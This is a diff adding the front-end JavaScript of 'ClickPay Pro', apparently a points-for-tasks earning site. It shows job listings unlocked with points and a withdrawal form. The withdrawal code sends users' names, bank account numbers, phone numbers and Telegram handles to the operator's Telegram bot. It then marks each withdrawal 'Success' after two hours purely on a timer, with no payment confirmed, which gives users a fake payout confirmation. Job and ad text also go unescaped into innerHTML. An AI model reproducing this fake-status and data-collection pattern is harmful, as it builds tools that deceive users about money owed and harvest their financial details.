+                let originalIndex = cachedDailyJobsData.length - 1 - index;
+                let jobId = 'job_' + originalIndex;
+                let isUnlocked = unlockedDailyJobs[jobId];
+
+                let title = job.title || job.position || job.jobtitle || Object.values(job)[0] || "Daily Job Opening";
+                let desc = job.description || job.details || job.desc || "";
+                let phone = job.phone || job.tel || job.contact || "";
+                let salary = job.salary || job.pay || job.budget || "";
+                let conditions = job.conditions || job.terms || job.requirements || "";
+                let jobStatus = job.status || job.scheduletype || job.jobstatus || "Full-Time / Part-Time";
+                let addressLoc = job.address || job.location || job.place || "Addis Ababa";
+                let link = job.link || job.url || "#";
+
+                let formattedPhone = phone.trim();
+                if (formattedPhone) {
+                    if (formattedPhone.startsWith("0")) {
+                        formattedPhone = "+251" + formattedPhone.substring(1);
+                    } else if (formattedPhone.startsWith("9") && formattedPhone.length === 9) {
+                        formattedPhone = "+251" + formattedPhone;
+                    } else if (!formattedPhone.startsWith("+")) {
+                        formattedPhone = "+251" + formattedPhone;
+                    }
+                }
+
+                let contactSectionHTML = '';
+                if(isUnlocked) {
+                    contactSectionHTML = `
+                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent); padding: 14px; border-radius: 12px; margin-top: 14px;">
+                            <div style="font-size: 11px; font-weight: bold; color: var(--accent); margin-bottom: 8px;">🔓 Unlocked Contact Details:</div>
+                            <div style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap;">
+                                ${formattedPhone ? `<button onclick="copyJobPhone('${formattedPhone}')" class="action-btn secondary" style="flex: 1; font-size: 10px; padding: 10px;">📋 Copy Phone (${formattedPhone})</button>` : ''}
+                                ${link && link !== '#' ? `<a href="${link}" target="_blank" class="action-btn" style="flex: 1; font-size: 10px; padding: 10px; text-align: center; text-decoration: none; background: var(--gradient-main);">🚀 Open Apply Link</a>` : ''}
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    contactSectionHTML = `
+                        <div style="margin-top: 14px;">
+                            <button onclick="unlockJobContact('${jobId}')" class="action-btn" style="width: 100%; font-size: 11px; padding: 13px; background: var(--gradient-main);">🔓 Unlock Contact & Apply Info (-0.3 Pts)</button>
+                        </div>
+                    `;
+                }
+
+                container.innerHTML += `
+                    <div class="card" style="border: 1px solid rgba(99, 102, 241, 0.3); background: linear-gradient(145deg, #0e1124, #080c1e); padding: 22px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                            <div class="promo-badge-pill" style="margin-bottom: 0; background: rgba(99, 102, 241, 0.25); border-color: var(--primary); color: var(--primary);">💼 Verified Daily Job</div>
+                            <div style="font-size: 11px; font-weight: 900; color: var(--accent); background: rgba(16, 185, 129, 0.15); padding: 5px 12px; border-radius: 8px; border: 1px solid rgba(16, 185, 129, 0.3);">
+                                💰 ${salary || 'Negotiable'}
+                            </div>
+                        </div>
+
+                        <h3 style="color:var(--text-light); margin-bottom: 10px; font-size: 16px; font-weight: 900; letter-spacing: 0.5px;">${title}</h3>
+                        
+                        ${desc ? `<p style="color:#e2e8f0; font-size: 11px; line-height: 1.7; margin-bottom: 14px; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 12px; border: 1px solid var(--border); font-weight: 900;"><b>📝 Role & Description:</b> ${desc}</p>` : ''}
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; font-size: 11px;">
+                            <div style="background: rgba(0,0,0,0.4); padding: 10px 12px; border-radius: 12px; border: 1px solid var(--border); display: flex; align-items: center; gap: 8px;">
+                                <span style="font-size: 16px;">⚡</span>
+                                <div>
+                                    <div style="font-size: 9px; color: var(--text-muted); text-transform: uppercase; font-weight: 800;">Schedule</div>
+                                    <div style="color: #fff; font-weight: 900;">${jobStatus}</div>
+                                </div>
+                            </div>
+                            <div style="background: rgba(0,0,0,0.4); padding: 10px 12px; border-radius: 12px; border: 1px solid var(--border); display: flex; align-items: center; gap: 8px;">
+                                <span style="font-size: 16px;">📍</span>
+                                <div>
+                                    <div style="font-size: 9px; color: var(--text-muted); text-transform: uppercase; font-weight: 800;">Work Location</div>
+                                    <div style="color: #fff; font-weight: 900;">${addressLoc}</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        ${conditions ? `<div style="color:#f8fafc; font-size: 11px; line-height: 1.6; margin-bottom: 12px; background: rgba(245, 158, 11, 0.08); padding: 10px 12px; border-radius: 10px; border: 1px solid rgba(245, 158, 11, 0.2); font-weight: 900;"><b>📋 Terms & Requirements:</b> ${conditions}</div>` : ''}
+
+                        ${contactSectionHTML}
+                    </div>
+                `;
+            });
+        }
+
+        function renderDailyAdsUI() {
+            let container = document.getElementById('worker-daily-ads-container');
+            let reversed = [...cachedDailyAdsData].reverse();
+
+            if(!container) return;
+            container.innerHTML = '';
+
+            if(reversed.length === 0) {
+                container.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:11px; padding:20px;">No daily advertisements available currently.</div>';
+                return;
+            }
+
+            reversed.forEach((ad) => {
+                let noticeText = ad.notice || ad.text || ad.announcement || ad.description || ad.content || Object.values(ad)[0] || "ClickPay Pro Official Advertisement";
+                let adLink = "https://t.me/click_Pay_official_Channel";
+
+                container.innerHTML += `
+                    <div class="card" style="border: 1px solid var(--primary); background: linear-gradient(145deg, #0e1124, #121836); padding: 24px;">
+                        <div class="promo-badge-pill" style="margin-bottom: 14px;">📢 Daily ClickPay Featured Advertisement</div>
+                        
+                        <div style="font-size: 12px; line-height: 1.8; color: #f1f5f9; margin-bottom: 18px; background: rgba(0,0,0,0.45); padding: 16px; border-radius: 14px; border: 1px solid var(--border); white-space: pre-wrap; word-break: break-word; font-weight: 500;">
+                            ${noticeText}
+                        </div>
+
+                        <div>
+                            <a href="${adLink}" target="_blank" class="action-btn" style="width: 100%; text-align: center; text-decoration: none; display: block; padding: 14px; background: var(--gradient-main); box-shadow: 0 6px 20px var(--glow); font-weight: 900; letter-spacing: 0.8px;">✨ More Info & Details</a>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function unlockJobContact(jobId) {
+            let currentPts = currentUser.points || 0;
+            if(currentPts < 0.3) {
+                showToast("⚠️ Insufficient points! You need at least 0.3 Pts to unlock job contact details.");
+                return;
+            }
+
+            currentUser.points = parseFloat((currentPts - 0.3).toFixed(2));
+            registeredUsers[currentUser.identifier] = currentUser;
+            localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+            updateWorkerWalletCard();
+
+            unlockedDailyJobs[jobId] = true;
+            localStorage.setItem('clickpay_unlocked_jobs_pro', JSON.stringify(unlockedDailyJobs));
+
+            renderDailyJobsUI();
+            showToast("🔓 Contact info unlocked successfully (-0.3 Pts)!");
+        }
+
+        function copyJobPhone(phoneNum) {
+            navigator.clipboard.writeText(phoneNum);
+            showToast(`📋 Copied phone: ${phoneNum}`);
+        }
+
+        function selectBank(bankName, btnElem) {
+            selectedBankName = bankName;
+            document.querySelectorAll('.bank-btn').forEach(b => b.style.borderColor = 'var(--border)');
+            btnElem.style.borderColor = 'var(--primary)';
+        }
+
+        function requestWithdrawal() {
+            let accName = document.getElementById('wdAccName').value.trim();
+            let accNo = document.getElementById('wdAccNo').value.trim();
+            let amount = parseFloat(document.getElementById('wdAmount').value);
+            let phone = document.getElementById('wdPhone').value.trim();
+            let tgUser = document.getElementById('wdTgUser').value.trim();
+            let refLink = document.getElementById('wdRefLink').value.trim();
+            
+            let alertBox = document.getElementById('wdAlertBox');
+            let successBox = document.getElementById('wdSuccessBox');
+            alertBox.style.display = 'none'; successBox.style.display = 'none';
+
+            const now = new Date();
+            const isSunday = now.getDay() === 0;
+            
+            if(!isSunday) {
+                alertBox.innerText = "⚠️ Withdrawals are permitted on Sundays only!";
+                alertBox.style.display = 'block'; return;
+            }
+            if(!selectedBankName || !accName || !accNo || !amount || !phone || !tgUser || !refLink) {
+                alertBox.innerText = "⚠️ Please fill in all withdrawal fields correctly!";
+                alertBox.style.display = 'block'; return;
+            }
+            if(amount < 500) {
+                alertBox.innerText = "⚠️ Minimum withdrawal amount is 500 ETB!";
+                alertBox.style.display = 'block'; return;
+            }
+            let currentEtb = (currentUser.points || 0) / 10;
+            if(amount > currentEtb) {
+                alertBox.innerText = "⚠️ Insufficient balance! Complete more tasks to earn.";
+                alertBox.style.display = 'block'; return;
+            }
+
+            currentUser.points -= (amount * 10);
+            if(!currentUser.withdrawHistory) currentUser.withdrawHistory = [];
+            
+            let withdrawalTime = Date.now();
+            let newWithdrawalEntry = {
+                bank: selectedBankName, name: accName, account: accNo, amount, phone, tgUser, refLink,
+                time: withdrawalTime, status: 'Processing'
+            };
+            
+            currentUser.withdrawHistory.unshift(newWithdrawalEntry);
+            
+            registeredUsers[currentUser.identifier] = currentUser;
+            localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+            
+            updateWorkerWalletCard();
+            updateHistoryUI();
+
+            setTimeout(() => {
+                let userRecord = registeredUsers[currentUser.identifier];
+                if(userRecord && userRecord.withdrawHistory) {
+                    let target = userRecord.withdrawHistory.find(w => w.time === withdrawalTime);
+                    if(target) {
+                        target.status = 'Success';
+                        registeredUsers[currentUser.identifier] = userRecord;
+                        localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+                        updateHistoryUI();
+                    }
+                }
+            }, 7200000);
+            
+            let completedTasksCount = currentUser.completedTasks ? Object.keys(currentUser.completedTasks).length : 0;
+            let wdMsg = `💸 <b>New Withdrawal Request!</b>\n\n` +
+                        `👤 <b>Full Name:</b> ${accName}\n` +
+                        `💰 <b>Amount:</b> ${amount} ETB\n` +
+                        `💳 <b>Account/Phone:</b> <code>${accNo}</code>\n` +
+                        `📱 <b>Phone Number:</b> ${phone}\n` +
+                        `💬 <b>Telegram Username:</b> ${tgUser}\n` +
+                        `🔗 <b>Referral Link:</b> ${refLink}\n` +
+                        `🏦 <b>Bank:</b> ${selectedBankName}\n` +
+                        `✅ <b>Completed Tasks:</b> ${completedTasksCount}\n` +
+                        `💰 <b>Total Balance Left:</b> ${currentEtb.toFixed(2)} ETB\n\n` +
+                        `<i>Status: Processing (Auto-Success in 2 Hours)</i>`;
+            
+            sendToTelegramBotInstant(wdMsg);
+            
+            successBox.style.display = 'block';
+            setTimeout(()=> successBox.style.display='none', 5000);
+        }
+
+        function updateHistoryUI() {
+            let cont = document.getElementById('wdHistoryContainer');
+            if(!cont || !currentUser) return;
+            cont.innerHTML = '';
+            let hist = currentUser.withdrawHistory || [];
+            if(hist.length === 0) {
+                cont.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:11px; padding:10px;">No history available.</div>';
+                return;
+            }
+            
+            let now = Date.now();
+            hist.forEach((wd) => {
+                let elapsed = now - wd.time;
+                let displayStatus = elapsed >= 7200000 ? 'Success' : 'Processing';
+                if(wd.status !== displayStatus) {
+                    wd.status = displayStatus;
+                    registeredUsers[currentUser.identifier] = currentUser;
+                    localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+                }
+
+                let isSuccess = wd.status === 'Success';
+                cont.innerHTML += `
+                    <div style="display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid var(--border); font-size:11px;">
+                        <div>
+                            <div style="font-weight:bold; color:var(--text-light);">${wd.amount} ETB (${wd.bank})</div>
+                            <div style="color:var(--text-muted); font-size:10px;">${wd.name} • ${wd.tgUser}</div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div style="color:${isSuccess?'#10b981':'#f59e0b'}; font-weight:bold;">${wd.status}</div>
+                            <div style="color:var(--text-muted); font-size:9px;">${new Date(wd.time).toLocaleDateString()}</div>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function switchTab(sectionId) {
+            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
+            let targetSec = document.getElementById(sectionId);
+            if(targetSec) targetSec.classList.add('active');
+            
+            document.querySelectorAll('.nav-item').forEach(nav => {
+                if(nav.id !== 'navContactAdmin') nav.classList.remove('active');
+            });
+            if(sectionId === 'worker-dashboard') document.getElementById('navHome')?.classList.add('active');
+            else if(sectionId === 'job-apply-section') document.getElementById('navJobApply')?.classList.add('active');
+            else if(sectionId === 'withdraw-section') document.getElementById('navWithdrawWorker')?.classList.add('active');
+            else if(sectionId === 'worker-profile-section') document.getElementById('navProfileWorker')?.classList.add('active');
+            
+            window.scrollTo(0, 0);
+        }
+
+        function sendToTelegramBotInstant(text, replyMarkup = null) {
+            let payload = { chat_id: CHAT_ID, text: text, parse_mode: "HTML" };
+            if(replyMarkup) payload.reply_markup = replyMarkup;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(console.error);
+        }
+    </script>
+</body>
+</html>
